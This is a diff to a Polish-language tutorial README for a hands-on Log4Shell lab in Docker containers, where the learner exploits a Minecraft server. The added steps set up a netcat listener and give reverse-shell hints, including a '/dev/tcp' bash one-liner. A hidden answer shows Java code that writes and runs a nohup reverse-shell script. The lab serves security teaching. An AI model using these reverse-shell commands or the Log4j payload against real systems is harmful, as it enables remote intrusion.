@@ -48,20 +48,29 @@ Dwa spośród trzech odpalonych przez Ciebie kontenerów są "Twoje" - jako hack
       - `docker run -p 1389:1389 -ti marshal`
 
    2. **Przygotuj kod do połączenia się z reverse shell i wystaw go na serwerze http:**
+      - przygotuj sobie `netcat` na hoście (swoim komputerze), może na wsl, a może zainstaluj na Windowsie,
+      - potem uruchamiasz nasłuchiwanie komendą `nc -l [port]`,
       - cd `codehttp/`
       - ten kontener służy do serwowania statycznych plików po http,
       - edytuj linijkę w pliku `Log4jRCE.java`,
-         1. musisz stworzyć plik, a poten ten plik uruchomić ¯\_(ツ)_/¯, uruchomienie komendy bezpośrednio nie działa,
-         2. możesz to zrobić jedną komendą :D
-         3. 
+         1. nie uruchamiaj komendy bezpośrednio, lecz stwórz plik, a potem uruchom go bashem,
+         2. dodaj " &" na końcu linijki w pliku gdzie uruchamiasz netcata, dzięki temu zostanie on uruchomiony w tle, a server Minecrafta nie scrashuje,
+         3. podpowiedzi:
+            1. `bash -c "..."`,
+            2. `echo "komenda > plik.sh" ; bash plik.sh`,
+            3. `nohup`,
+            4. `bash -i >/dev/tcp/[ip hosta]/[port nasluchujacy] 2>&1 0<&1`,
+            5. ` &`,
+         4. 
             <details>
             <summary><b> Pokaż komendę:</b></summary>
 
             ```java
-            String[] cmd = {"bash", "-c", "echo 'nohup bash -i >/dev/tcp/172.17.0.1/5000 2>&1 0<&1 &' > /server/script.sh; bash /server/script.sh"};
+            String[] cmd = {"bash", "-c", "echo 'nohup bash -i >/dev/tcp/[ip hosta]/[port nasluchujacy] 2>&1 0<&1 &' > /server/script.sh; bash /server/script.sh"};
             ```
 
             </details>
+         .4 
       - podczas budowania obrazu zostanie ten plik do niego skopiowany, a następnie skompilowany,
       - a po uruchomieniu kontenera, będzie serwowany plik "Log4jRCE.class" na porcie *:8888* tego kontenera,
       - zbuduj obraz: `docker build . -t codehttp`,
